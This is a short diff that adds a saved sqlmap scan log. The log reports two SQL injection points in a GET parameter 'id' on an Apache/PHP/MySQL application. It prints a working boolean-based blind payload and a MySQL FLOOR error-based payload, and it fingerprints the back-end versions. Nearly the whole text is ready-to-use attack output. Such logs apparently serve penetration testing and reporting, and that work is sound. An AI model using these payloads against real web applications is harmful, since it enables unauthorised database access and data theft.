@@ -1,0 +1,13 @@
+sqlmap identified the following injection point(s) with a total of 429 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment) (NOT)
+    Payload: id=446 OR NOT 2000=2000#
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=446 AND (SELECT 4946 FROM(SELECT COUNT(*),CONCAT(0x716a627071,(SELECT (ELT(4946=4946,1))),0x7171626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+---
+web application technology: Apache, PHP 5.2.17
+back-end DBMS: MySQL >= 5.0
